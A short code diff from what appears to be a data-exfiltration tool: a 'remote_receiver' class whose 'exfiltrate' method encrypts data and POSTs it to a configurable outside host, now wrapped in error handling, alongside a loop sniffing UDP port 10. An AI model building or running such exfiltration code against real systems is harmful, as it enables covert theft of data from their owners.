@@ -19,7 +19,10 @@ class remote_receiver:
         self.host = ''
 
     def exfiltrate(self, data, opt):
-        requests.post("http://" + self.host, data=self.encrypter.encrypt(opt) + b'\t' + self.encrypter.encrypt(data))
+        try:
+            requests.post("http://" + self.host, data=self.encrypter.encrypt(opt) + b'\t' + self.encrypter.encrypt(data))
+        except requests.RequestException:
+            return "Receiver not found"
 
     def listen_loop(self):
         sniff(filter="udp and port 10", prn=self.packet_handler)
